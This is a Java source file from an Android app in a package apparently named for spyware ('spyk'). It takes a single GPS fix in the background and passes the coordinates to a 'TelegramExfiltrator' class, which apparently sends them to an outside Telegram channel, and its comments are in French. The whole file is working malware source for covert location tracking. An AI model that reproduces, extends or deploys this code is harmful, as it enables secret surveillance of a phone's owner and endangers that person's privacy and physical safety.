package com.ware.spyk;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Log;

import androidx.core.app.ActivityCompat;

public class GetLocalisation {

    public static void captureOnce(Context context) {
        Log.d("GetLocalisation", "captureOnce");
        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.d("GetLocalisation", "Pas de permission");
            return;
        }

        LocationListener listener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                double lat = location.getLatitude();
                double lon = location.getLongitude();
                Log.d("GetLocalisation", "nouvelle Localisation : " + lat + ", " + lon);
                TelegramExfiltrator.sendTexte("Localisation : " + lat + ", " + lon);
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {
                // Rien ici, mais requis pour éviter le crash sur certaines versions
            }

            @Override
            public void onProviderEnabled(String provider) {}

            @Override
            public void onProviderDisabled(String provider) {}
        };

        HandlerThread handlerThread = new HandlerThread("LocationThread");
        handlerThread.start();
        Looper looper = handlerThread.getLooper();

        locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, looper);
    }
}
